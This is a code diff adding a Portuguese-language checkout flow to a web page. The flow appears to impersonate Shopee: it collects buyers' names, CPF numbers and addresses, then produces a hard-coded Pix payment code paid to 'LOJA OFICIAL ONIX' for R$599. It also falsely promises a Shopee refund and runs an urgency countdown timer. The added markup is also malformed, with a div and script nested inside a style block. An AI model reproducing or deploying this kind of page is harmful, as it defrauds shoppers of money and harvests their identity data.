@@ -104,6 +104,156 @@
         /* Ajuste para remover as linhas coloridas e organizar novos campos */
         .qty-container { display: flex; align-items: center; justify-content: space-between; padding: 10px; background: #fafafa; border-radius: 4px; margin: 10px 0; }
         .qty-btn { width: 32px; height: 32px; border: 1px solid #ddd; background: #fff; font-size: 18px; border-radius: 4px; }
+        <style>
+    /* Estilos Adicionais para bater com as imagens */
+    .checkout-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; font-size: 14px; }
+    .shipping-box { border: 1px solid var(--teal); background: #f6fffd; padding: 10px; border-radius: 4px; margin: 10px 0; position: relative; }
+    .shipping-box.selected::after { content: '✔'; position: absolute; top: 5px; left: 5px; color: var(--teal); font-size: 12px; }
+    .payment-method { border: 1px solid #eee; padding: 15px; border-radius: 4px; display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
+    .summary-title { font-weight: bold; margin: 15px 0 10px 0; border-left: 3px solid var(--shopee); padding-left: 8px; }
+</style>
+
+<div id="modal" class="modal">
+    <div class="modal-content">
+        
+        <div id="selection-screen">
+            <div style="display:flex; align-items:center; margin-bottom:15px;">
+                <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" style="width:80px; height:80px; border-radius:4px;">
+                <div style="margin-left:15px;"><div style="color:var(--shopee); font-size:20px; font-weight:500;">R$599,00</div><div style="font-size:12px; color:#888;">Estoque: 1071</div></div>
+            </div>
+            <p style="font-size:14px; margin-bottom:10px;">Escolha a Cor</p>
+            <div class="options-grid">
+                <button class="opt-btn" onclick="selectVar(this)">AMARELO</button>
+                <button class="opt-btn" onclick="selectVar(this)">PRETO</button>
+                <button class="opt-btn" onclick="selectVar(this)">CINZA</button>
+                <button class="opt-btn" onclick="selectVar(this)">IRON MAN</button>
+            </div>
+            <button class="btn-buy" style="width:100%; height:45px; border-radius:4px; margin-top:20px;" onclick="goToForm()">PRÓXIMO</button>
+            <button class="btn-voltar" onclick="document.getElementById('modal').style.display='none'">VOLTAR</button>
+        </div>
+
+        <div id="form-screen" style="display:none;">
+            <p style="font-weight:bold; margin-bottom:15px; font-size:16px; text-align:center;">Dados de Entrega</p>
+            <input type="text" id="nome" class="input-box" placeholder="Nome Completo">
+            <input type="tel" id="cpf" class="input-box" placeholder="CPF" maxlength="11">
+            <div class="cep-row">
+                <input type="tel" id="cep" class="input-box" style="margin-bottom:0;" placeholder="CEP" maxlength="8">
+                <button class="btn-cep" onclick="buscarCEP()">BUSCAR</button>
+            </div>
+            <input type="text" id="rua" class="input-box" placeholder="Endereço Completo">
+            <button class="btn-buy" style="width:100%; height:45px; border-radius:4px; margin-top:10px;" onclick="goToCheckout()">PRÓXIMO</button>
+        </div>
+
+        <div id="checkout-screen" style="display:none;">
+            <div style="background:#fff; border-bottom: 2px dashed #ee4d2d; padding-bottom:10px; margin-bottom:15px;">
+                <i class="fas fa-map-marker-alt" style="color:#ee4d2d"></i> <span id="resumo-endereco" style="font-size:13px; color:#555;"></span>
+            </div>
+
+            <p class="summary-title">Opção de Envio</p>
+            <div class="shipping-box selected" onclick="setFrete(0)">
+                <div style="display:flex; justify-content:space-between; font-weight:bold; font-size:14px;">
+                    <span>Grátis (8-10 dias)</span>
+                    <span style="color:var(--teal)">R$0,00</span>
+                </div>
+                <div style="font-size:12px; color:#888;">Receba entre 20 de fev e 22 de fev</div>
+            </div>
+
+            <p class="summary-title">Método de Pagamento</p>
+            <div class="payment-method">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo_Pix.png" width="20">
+                <span style="font-weight:bold; font-size:14px;">Pix</span>
+                <input type="radio" checked style="margin-left:auto;">
+            </div>
+
+            <p class="summary-title">Detalhes do Pagamento</p>
+            <div class="checkout-row"><span>Total dos Produtos</span> <span>R$599,00</span></div>
+            <div class="checkout-row"><span>Total do Frete</span> <span id="txt-frete">R$0,00</span></div>
+            <div class="checkout-row" style="font-weight:bold; font-size:18px; color:var(--shopee);">
+                <span>Pagamento Total</span> <span id="txt-total">R$599,00</span>
+            </div>
+
+            <button class="btn-buy" style="width:100%; height:50px; border-radius:4px; margin-top:20px; font-size:16px;" onclick="finalizar()">FAZER PEDIDO</button>
+        </div>
+
+        <div id="pix-screen" style="display:none; text-align:center;">
+            <div class="garantia-shopee">
+                <i class="fas fa-shield-alt"></i>
+                <span>Se o produto não for entregue,<br>a Shopee devolve seu dinheiro!</span>
+            </div>
+            <p style="font-weight:bold; color:var(--teal); margin-bottom: 5px;">Código PIX Gerado!</p>
+            <img id="qrc" src="" style="margin:10px 0; width:180px;">
+            <div id="pix-code" style="background:#f5f5f5; padding:10px; font-size:10px; word-break:break-all; margin-bottom:15px; border: 1px dashed #ccc;"></div>
+            <button class="btn-buy" style="width:100%; height:40px; border-radius:4px;" onclick="copiarPix()">COPIAR CÓDIGO</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Configurações do PIX e Valor
+    const PIX_VALUE = "599.00";
+    const PIX_BASE = "00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b5520400005303986540";
+    const PIX_FINAL_PART = "5802BR5917LOJA OFICIAL ONIX6009SAO PAULO62070503***630453AF";
+
+    let selectedVar = null;
+
+    function openModal() { document.getElementById('modal').style.display='block'; }
+
+    function selectVar(btn) {
+        document.querySelectorAll('.opt-btn').forEach(b => b.classList.remove('selected'));
+        btn.classList.add('selected');
+        selectedVar = btn.innerText;
+    }
+
+    function goToForm() {
+        if(!selectedVar) return alert("Selecione uma cor.");
+        document.getElementById('selection-screen').style.display='none';
+        document.getElementById('form-screen').style.display='block';
+    }
+
+    function goToCheckout() {
+        const nome = document.getElementById('nome').value;
+        const rua = document.getElementById('rua').value;
+        if(!nome || !rua) return alert("Preencha seus dados.");
+        
+        document.getElementById('resumo-endereco').innerText = nome + " | " + rua;
+        document.getElementById('form-screen').style.display='none';
+        document.getElementById('checkout-screen').style.display='block';
+    }
+
+    async function buscarCEP() {
+        let cep = document.getElementById('cep').value.replace(/\D/g, '');
+        if(cep.length === 8) {
+            let r = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+            let d = await r.json();
+            if(!d.erro) document.getElementById('rua').value = d.logradouro + ", " + d.bairro + " - " + d.localidade;
+        }
+    }
+
+    function finalizar() {
+        const pixFull = PIX_BASE + PIX_VALUE + PIX_FINAL_PART;
+        document.getElementById('checkout-screen').style.display='none';
+        document.getElementById('pix-screen').style.display='block';
+        document.getElementById('pix-code').innerText = pixFull;
+        document.getElementById('qrc').src = "https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=" + encodeURIComponent(pixFull);
+    }
+
+    function copiarPix() {
+        const code = document.getElementById('pix-code').innerText;
+        navigator.clipboard.writeText(code);
+        alert('Copiado com sucesso!');
+    }
+
+    // Timer Original mantido
+    let totalSeconds = 5400;
+    setInterval(() => {
+        let h = Math.floor(totalSeconds / 3600), m = Math.floor((totalSeconds % 3600) / 60), s = totalSeconds % 60;
+        document.getElementById('h').innerText = String(h).padStart(2, '0');
+        document.getElementById('m').innerText = String(m).padStart(2, '0');
+        document.getElementById('s').innerText = String(s).padStart(2, '0');
+        if(totalSeconds > 0) totalSeconds--;
+    }, 1000);
+</script>
+    
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
 </head>
@@ -323,3 +473,4 @@
     </script>
 </body>
 </html>
+
